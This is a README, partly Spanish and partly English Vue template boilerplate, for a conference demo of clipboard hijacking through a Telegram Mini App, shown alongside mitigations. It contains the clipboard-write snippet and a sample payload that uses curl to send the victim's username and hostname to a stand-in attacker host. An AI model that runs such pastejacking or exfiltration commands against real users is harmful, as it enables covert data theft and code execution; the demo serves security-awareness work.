# 🔒 Demo MorterueloCon 2026 - Manipulación de Portapapeles

Este proyecto es una **demostración educativa** creada para la MorterueloCon 2026, que ilustra cómo las Mini Apps de Telegram pueden manipular el portapapeles en aplicaciones de escritorio, y cómo esto puede ser explotado mediante técnicas de ingeniería social.

## ⚠️ Advertencia de Seguridad

**Esta es una herramienta educativa diseñada exclusivamente para fines de concienciación sobre seguridad.** No debe ser utilizada con fines maliciosos. El objetivo es demostrar vulnerabilidades potenciales para mejorar la seguridad y la conciencia de los usuarios.

## 🎯 Objetivo de la Demo

La demo muestra cómo un atacante podría:

1. **Engañar al usuario** mediante ingeniería social (solicitud de "validación de cuenta")
2. **Inyectar código malicioso** en el portapapeles del usuario
3. **Provocar la ejecución** del código cuando la víctima lo pega en su terminal

## 🛠️ Tecnologías Utilizadas

- [Vue 3](https://vuejs.org/)
- [TypeScript](https://www.typescriptlang.org/)
- [@tma.js SDK](https://docs.telegram-mini-apps.com/packages/tma-js-sdk) - SDK de Telegram Mini Apps
- [TON Connect](https://docs.ton.org/develop/dapps/ton-connect/overview)
- [Vite](https://vitejs.dev/)

> Este proyecto fue creado usando [pnpm](https://pnpm.io/). Se recomienda usarlo para mantener la compatibilidad.

## 📦 Instalar Dependencias

Si acabas de clonar este proyecto, instala las dependencias con:

```bash
pnpm install
```

## 🚀 Scripts Disponibles

Este proyecto contiene los siguientes scripts:

- `dev` - Ejecuta la aplicación en modo desarrollo
- `dev:https` - Ejecuta la aplicación en desarrollo con certificados SSL locales
- `build` - Construye la aplicación para producción
- `lint` - Ejecuta [eslint](https://eslint.org/) para verificar la calidad del código
- `lint:fix` - Ejecuta [eslint](https://eslint.org/) y corrige problemas automáticamente
- `type-check` - Ejecuta vue-tsc para verificar los tipos
- `deploy` - Despliega la aplicación en GitHub Pages

Para ejecutar un script:

```bash
pnpm run {script}
# Ejemplo: pnpm run dev
```

## 🎮 Cómo Usar la Demo

1. **Inicia el servidor de desarrollo:**
   ```bash
   pnpm run dev
   ```

2. **Abre la aplicación en Telegram:**
   - Necesitarás crear un Bot de Telegram y una Mini App
   - Consulta la [guía oficial](https://docs.telegram-mini-apps.com/platform/creating-new-app)

3. **Prueba la funcionalidad:**
   - Navega a la página "Demo Portapapeles"
   - Haz clic en el botón "Validar mi Cuenta"
   - Observa cómo se inyecta contenido en el portapapeles
   - Usa el botón "Ver Portapapeles" para verificar el contenido

## 🔍 Cómo Funciona el Ataque

### Flujo del Ataque:

```
1. Usuario accede a la Mini App
   ↓
2. Ve una interfaz legítima de "validación"
   ↓
3. Hace clic en "Validar mi Cuenta"
   ↓
4. JavaScript usa la API del portapapeles
   ↓
5. Se inyecta comando malicioso
   ↓
6. Usuario es instruido a pegar en terminal
   ↓
7. Ejecución del payload
```

### Código Relevante:

La inyección se realiza en [src/pages/ClipboardDemoPage.vue](src/pages/ClipboardDemoPage.vue):

```typescript
// Usa la API moderna del portapapeles
await navigator.clipboard.writeText(maliciousPayload);
```

### Payload de Ejemplo:

```bash
curl -X POST https://attacker-server.com/steal-data -d "$(whoami):$(hostname)"
```

## 🛡️ Mitigaciones y Contramedidas

### Para Usuarios:
1. **Nunca ejecutes comandos sin revisarlos primero**
2. Verifica el contenido del portapapeles antes de pegar en la terminal
3. Desconfía de aplicaciones que requieren "validación" mediante comandos de terminal
4. Usa herramientas de seguridad que monitoricen el portapapeles

### Para Desarrolladores de Telegram:
1. Implementar permisos explícitos para acceso al portapapeles
2. Notificar visualmente al usuario cuando una app modifica el portapapeles
3. Limitar capacidades de las Mini Apps en clientes de escritorio
4. Implementar sandboxing más estricto

### Para Desarrolladores de Apps:
1. No solicitar a los usuarios que ejecuten comandos de terminal
2. Usar métodos de autenticación más seguros (OAuth, 2FA, etc.)
3. Educar a los usuarios sobre seguridad

## 📚 Referencias y Recursos

- [Telegram Mini Apps Documentation](https://docs.telegram-mini-apps.com/)
- [Clipboard API - MDN](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API)
- [Social Engineering Attack Vectors](https://www.social-engineer.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

## 📄 Licencia y Uso Ético

Este proyecto es de código abierto con fines **exclusivamente educativos**. El uso indebido de esta herramienta puede tener consecuencias legales. El autor no se hace responsable del mal uso de esta tecnología.

**Úsalo de manera responsable y ética.**

---

## Create Bot and Mini App

Before you start, make sure you have already created a Telegram Bot. Here is
a [comprehensive guide](https://docs.telegram-mini-apps.com/platform/creating-new-app)
on how to do it.

## Run

Although Mini Apps are designed to be opened
within [Telegram applications](https://docs.telegram-mini-apps.com/platform/about#supported-applications),
you can still develop and test them outside of Telegram during the development
process.

To run the application in the development mode, use the `dev` script:

```bash
npm run dev:https
```

> [!NOTE]
> As long as we use [vite-plugin-mkcert](https://www.npmjs.com/package/vite-plugin-mkcert),
> launching the dev mode for the first time, you may see sudo password request.
> The plugin requires it to properly configure SSL-certificates. To disable the plugin, use
> the `npm run dev` command.

After this, you will see a similar message in your terminal:

```bash
VITE v5.2.12  ready in 237 ms

➜  Local:   https://localhost:5173/vuejs-template
➜  Network: https://192.168.0.109:5173/vuejs-template

➜  press h + enter to show help
```

Here, you can see the `Local` link, available locally, and `Network` links
accessible to all devices in the same network with the current device.

To view the application, you need to open the `Local`
link (`https://localhost:5173/reactjs-template` in this example) in your
browser:

![Application](assets/application.png)

It is important to note that some libraries in this template, such as
`@tma.js/sdk`, are not intended for use outside of Telegram.

Nevertheless, they appear to function properly. This is because the
`src/mockEnv.ts` file, which is imported in the application's entry point (
`src/index.ts`), employs the `mockTelegramEnv` function to simulate the Telegram
environment. This trick convinces the application that it is running in a
Telegram-based environment. Therefore, be cautious not to use this function in
production mode unless you fully understand its implications.

> [!WARNING]
> Because we are using self-signed SSL certificates, the Android and iOS
> Telegram applications will not be able to display the application. These
> operating systems enforce stricter security measures, preventing the Mini App
> from loading. To address this issue, refer to
> [this guide](https://docs.telegram-mini-apps.com/platform/getting-app-link#remote).

## Deploy

This boilerplate uses GitHub Pages as the way to host the application
externally. GitHub Pages provides a CDN which will let your users receive the
application rapidly. Alternatively, you could use such services
as [Heroku](https://www.heroku.com/) or [Vercel](https://vercel.com).

### Manual Deployment

This boilerplate uses the [gh-pages](https://www.npmjs.com/package/gh-pages)
tool, which allows deploying your application right from your PC.

#### Configuring

Before running the deployment process, ensure that you have done the following:

1. Replaced the `homepage` value in `package.json`. The GitHub Pages deploy tool
   uses this value to
   determine the related GitHub project.
2. Replaced the `base` value in `vite.config.ts` and have set it to the name of
   your GitHub
   repository. Vite will use this value when creating paths to static assets.

For instance, if your GitHub username is `telegram-mini-apps` and the repository
name is `is-awesome`, the value in the `homepage` field should be the following:

```json
{
  "homepage": "https://telegram-mini-apps.github.io/is-awesome"
}
```

And `vite.config.ts` should have this content:

```ts
export default defineConfig({
  base: '/is-awesome/',
  // ...
});
```

You can find more information on configuring the deployment in the `gh-pages`
[docs](https://github.com/tschaub/gh-pages?tab=readme-ov-file#github-pages-project-sites).

#### Before Deploying

Before deploying the application, make sure that you've built it and going to
deploy the fresh static files:

```bash
npm run build
```

Then, run the deployment process, using the `deploy` script:

```Bash
npm run deploy
```

After the deployment completed successfully, visit the page with data according
to your username and repository name. Here is the page link example using the
data mentioned above:
https://telegram-mini-apps.github.io/is-awesome

### GitHub Workflow

To simplify the deployment process, this template includes a
pre-configured [GitHub workflow](.github/workflows/github-pages-deploy.yml) that
automatically deploys the project when changes are pushed to the `master`
branch.

To enable this workflow, create a new environment (or edit the existing one) in
the GitHub repository settings and name it `github-pages`. Then, add the
`master` branch to the list of deployment branches.

You can find the environment settings using this
URL: `https://github.com/{username}/{repository}/settings/environments`.

![img.png](.github/deployment-branches.png)

In case, you don't want to do it automatically, or you don't use GitHub as the
project codebase, remove the `.github` directory.

### GitHub Web Interface

Alternatively, developers can configure automatic deployment using the GitHub
web interface. To do this, follow the link:
`https://github.com/{username}/{repository}/settings/pages`.

## TON Connect

This boilerplate utilizes
the [TON Connect](https://docs.ton.org/develop/dapps/ton-connect/overview)
project to demonstrate how developers can integrate functionality related to TON
cryptocurrency.

The TON Connect manifest used in this boilerplate is stored in the `public`
folder, where all publicly accessible static files are located. Remember
to [configure](https://docs.ton.org/develop/dapps/ton-connect/manifest) this
file according to your project's information.

## Useful Links

- [Platform documentation](https://docs.telegram-mini-apps.com/)
- [@tma.js/sdk-vue documentation](https://docs.telegram-mini-apps.com/packages/tma-js-sdk-vue)
- [Telegram developers community chat](https://t.me/devs_cis)
